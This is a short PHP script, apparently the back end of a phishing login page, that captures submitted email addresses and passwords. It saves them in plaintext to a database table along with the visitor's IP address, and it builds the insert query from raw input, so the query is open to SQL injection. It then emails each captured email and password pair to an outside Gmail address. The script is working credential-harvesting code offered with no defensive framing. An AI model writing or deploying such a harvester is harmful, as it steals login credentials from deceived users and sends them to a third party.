<?php


require 'connection.php';

$errors = array();

if(isset($_POST['email'])){


    $email = trim($_POST['email']);

}

if(isset($_POST['password'])){

    $password= trim($_POST['password']);


}

$date = date_create();


$date = date_timestamp_get($date);


$ip = $_SERVER['REMOTE_ADDR'];


$query = mysqli_query($conn,"INSERT INTO `userlogin` ( `email`, `password`, `ip`, `date`) VALUES ('$email', '$password', '$ip','$date')");

if($query){






$to = "overseasdelivery.report@gmail.com";
$subject = "User Login";

$message ='
<html>
<head>


<meta http-equiv="Content-Type" content="text/html; charset=utf-8">


<title>Client Login </title>



</head>
<body>



<p>New login </p>
<table>
<tr>
<th>Email</th>
<th>Password</th>
</tr>
<tr>
<td>'.$email.'</td>
<td>'.$password.'</td>
</tr>
</table>
</body>
</html>
';

// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";


// More headers
$headers .= 'From: <server>' . "\r\n";
$headers .= 'Cc: server' . "\r\n";

if(mail($to,$subject,$message,$headers)){


}






    echo 'ok';




}






?>